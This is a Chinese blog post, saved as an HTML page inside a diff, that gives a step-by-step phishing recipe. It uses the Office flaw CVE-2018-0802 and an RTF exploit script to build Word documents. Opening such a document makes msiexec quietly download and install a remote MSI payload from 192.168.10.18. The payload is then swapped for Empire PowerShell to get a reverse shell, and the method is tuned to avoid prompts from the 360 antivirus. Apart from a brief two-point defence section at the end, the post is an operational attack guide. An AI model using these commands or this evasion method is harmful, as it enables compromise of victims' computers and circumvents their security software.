@@ -1,0 +1,195 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>绕过360进行Word文档钓鱼 | Mari0er&#39;s Blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://mari0er.top/favicon.ico?v=1768205765236">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://mari0er.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://mari0er.top">
+        <img class="avatar" src="https://mari0er.top/images/avatar.png?v=1768205765236" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://mari0er.top">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="https://mari0er.top/post/about.html" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+            <div class="feature-container" style="background-image: url('https://tuchuang.looklook.workers.dev/0202/%E4%B8%8B%E8%BD%BD.jpg')">
+            </div>
+          
+          <h2 class="post-title">绕过360进行Word文档钓鱼</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2018-02-15</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://mari0er.top/tag/diao-yu/">
+                    钓鱼
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/empire/">
+                    empire
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>俗话说：姜太公钓鱼，愿者上钩！现在apt比较流行，这里记录一下Word文档的钓鱼攻击手法。</p>
+<!-- more -->
+<p>  之前通过域或者宏功能进行攻击的钓鱼文档，需要目标用鼠标进行点击交互，并且会有明显的弹窗提示，容易被察觉，并且现在已经被大部分杀软查杀。之后，今年一月又爆出一个新的Office 0day漏洞（CVE-2018-0802），关于该漏洞的详细信息请点击<a href="http://www.freebuf.com/vuls/159789.html">这里</a>,国内的Ridter大佬根据github上公开的一个<a href="https://github.com/zldww2011/CVE-2018-0802_POC">利用脚本</a>，编写了一个改进版的利用脚本--RTF_11882_0802,大佬Github<a href="https://github.com/Ridter/RTF_11882_0802/">地址</a>。自己技术菜，不是很了解原理，在这里就分享下我的利用方法，以及如何绕过杀软弹窗，大佬们轻喷！</p>
+<h2 id="0x01">0x01</h2>
+<p>  首先下载该脚本，利用方法github上说的很清楚了,这里说下 <strong>-i</strong> 参数，test.rtf为你的输入文档，即运行下方代码后，生成的Doc文档内容和test.rtf一致。你可以事先写好一份文档内容，另存为RTF格式，为后续步骤准备。</p>
+<pre><code>python RTF_11882_0802.py -c &quot;cmd.exe /c calc.exe&quot; -o test.doc -i test.rtf
+</code></pre>
+<p>  上述代码很简单，在没有杀软的情况下用Office软件打开Doc文件可以完美弹出计算器，但是在有360的情况下，纳尼？？直接报毒！好吧，毕竟360！于是，尝试其他命令执行漏洞的方法。例如之前常用的的powershell,mshta,regsvr32,这些方法都不会报毒，但是会有弹窗提示用户有风险程序需要运行，很明显一般人都会点击阻止程序运行，谁会点击允许啊？神经病啊！！！<br>
+<img src="https://tuchuang.looklook.workers.dev/0202/0201_cmd.png" alt="" loading="lazy"></p>
+<h2 id="0x02">0x02</h2>
+<p>  没办法，只能去寻找不触发弹窗并且最好是Windows自带的程序。Google了半天，最终找到了一个好方法,参考链接请点击<a href="https://baijiahao.baidu.com/s?id=1586899175661391940&amp;wfr=spider&amp;for=pc">这里</a>，利用Windows系统自带的msiexec程序下载并远程运行msi文件，以达到执行特定命令的目的。为了方便阅读，Wix工具下载请点击<a href="https://archive.codeplex.com/?p=wix">这里</a>,wix文件模板下载请点击<a href="https://github.com/mari0er/picture/blob/master/0202/calc.wix">这里</a>。安装完Wix工具后执行下列前两条命令，会在同目录下生成一个calc.msi文件。最后一条命令表示远程下载并利用msiexec运行calc.msi文件。<br>
+<strong>这里解释下参数的意义</strong>:　<strong>/q</strong> --以安静模式运行　<strong>/i</strong> --官方解释是状态消息，不加的话会弹出Windows Installer框引起怀疑</p>
+<pre><code>C:\Program Files (x86)\WiX Toolset v3.10\bin&gt;candle.exe calc.wix
+C:\Program Files (x86)\WiX Toolset v3.10\bin&gt;light.exe calc.wixobj
+C:\Program Files (x86)\WiX Toolset v3.10\bin&gt;msiexec /q /i http://192.168.10.18/calc.msi
+</code></pre>
+<p><strong>注意</strong>：Cmd需要以管理员身份运行，利用模板文件默认打开电脑计算器，若要执行其他命令请自行修改模板文件的第16行</p>
+<h2 id="0x03">0x03</h2>
+<p>  下面使用empire和上述的方法制作一份钓鱼文档。首先配置好empire，具体的配置内容可以参考<a href="https://mari0er.top/post/empire.html">这篇文章</a>,之后将生成的powershell代码复制粘贴到wix模板的第15行，替换之前打开计算器的代码，然后,用第二步的方法制作成msi文件，最后利用RTF脚本生成doc文件。此时打开Word文档就会远程执行下载和安装msi木马的命令，进一步运行powershell进行反弹。</p>
+<pre><code>python RTF_11882_0802.py -c &quot;msiexec /q /i http://192.168.10.18/calc.msi&quot; -o test.doc -i test.rtf
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://tuchuang.looklook.workers.dev/0202/0202_empire.png" alt="empire" loading="lazy"></figure>
+<h2 id="0x04">0x04</h2>
+<p>  看到这里有人可能要问：为什么非要先调用msi文件再间接调用powershell呢？直接把执行命令通过RTF脚本写到文档里不是更方便吗？这里说一下，经过我的测试发现，直接利用RTF脚本运行命令，在360存在的情况下一定会弹窗，但通过msi安装文件却不会，其次RTF脚本  <strong>-c</strong>  参数有109字节数限制。其实还有很多其他的利用方法，比如利用msiexec直接下载并运行msfvenom制作的msi木马文件，可以直接获得meterpreter会话。但是，需要提前对msi木马文件进行免杀处理。<br>
+<img src="https://tuchuang.looklook.workers.dev/0202/0203_gif.gif" alt="" loading="lazy"></p>
+<h2 id="0x05">0x05</h2>
+<p>防护方法：1.及时打上微软推出的补丁 2.不要随意下载未知邮件里的文档，更不要随意打开并查看文档内容。</p>
+<blockquote>
+<p>作者： Mari0er<br>
+链接： https://mari0er.top/post/fishing.html<br>
+版权： 本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！</p>
+</blockquote>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://mari0er.top/post/empire.html/">
+              <h3 class="post-title">
+                下一篇：渗透利器之Empire--帝国
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan"></div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  待人友善是修养 独来独往是性格 | <a class="rss" href="https://mari0er.top/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
